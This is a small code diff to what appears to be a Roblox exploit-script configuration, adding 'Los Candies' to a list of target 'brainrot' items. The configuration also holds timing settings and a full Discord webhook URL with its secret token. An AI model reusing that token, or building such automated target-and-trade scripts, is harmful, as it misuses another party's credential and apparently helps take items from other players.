@@ -4,6 +4,7 @@ getgenv().DELAY_STEP = 1
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1486084927337398444/ja7lfKWpY0nhepK91y6UFXII97benBFxEb89xZQnKxYbNW9cIg3iIThRO3uBlKUyotsy"
 getgenv().TARGET_BRAINROTS = {
+    ["Los Candies"] = true,
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
     ["Strawberry Elephant"] = true,
